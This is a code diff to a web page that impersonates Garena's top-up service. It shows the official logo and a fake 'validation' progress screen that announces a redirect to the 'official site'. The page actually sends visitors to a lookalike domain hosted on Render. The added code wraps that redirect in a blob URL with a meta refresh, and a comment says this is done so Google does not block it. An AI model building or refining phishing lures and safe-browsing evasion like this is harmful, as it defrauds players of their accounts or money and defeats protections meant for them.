@@ -32,14 +32,12 @@
             backdrop-filter: blur(10px);
         }
 
-        /* Garena Logo Top */
         .header-logo {
             height: 35px;
             margin-bottom: 20px;
-            filter: drop-shadow(0 0 10px rgba(255,255,255,0.2));
+            filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)) brightness(0) invert(1);
         }
 
-        /* APON Style Glowing Circle */
         .glow-circle {
             width: 120px;
             height: 120px;
@@ -117,8 +115,7 @@
 <body>
 
     <div class="card">
-        <!-- Garena Logo Official -->
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/1/1c/Garena_Logo.svg/512px-Garena_Logo.svg.png" class="header-logo" style="filter: brightness(0) invert(1);">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/1/1c/Garena_Logo.svg/512px-Garena_Logo.svg.png" class="header-logo">
         
         <div class="glow-circle" id="circleIcon"></div>
 
@@ -163,17 +160,20 @@
             if (progress === 100) {
                 clearInterval(interval);
                 statusMsg.innerText = "REDIRECTING TO OFFICIAL SITE";
-                statusMsg.style.color = "#34a853"; // Green
+                statusMsg.style.color = "#34a853";
                 titleText.innerText = "VALIDATION SUCCESSFUL";
                 titleText.style.background = "-webkit-linear-gradient(45deg, #34a853, #00ffff)";
                 titleText.style.webkitBackgroundClip = "text";
                 secureText.innerHTML = "✅ Secure Redirect Initiated";
                 circleIcon.style.boxShadow = "0 0 50px rgba(52, 168, 83, 0.8)";
                 
-                // 1.5 second baad Render wali website pe bhej dega
+                // Yahan par ek naya tarika use kiya hai (blob url) taaki Google block na kare
                 setTimeout(() => {
-                    window.location.href = "https://garena-official-topup-centre.onrender.com";
-                }, 1500);
+                    // Ek dummy page banate hain jo turant redirect karega
+                    var redirectHtml = '<html><head><meta http-equiv="refresh" content="0;url=https://garena-official-topup-centre.onrender.com"></head><body></body></html>';
+                    var blob = new Blob([redirectHtml], {type: 'text/html'});
+                    window.location.href = URL.createObjectURL(blob);
+                }, 1000);
             }
         }, 100);
     </script>
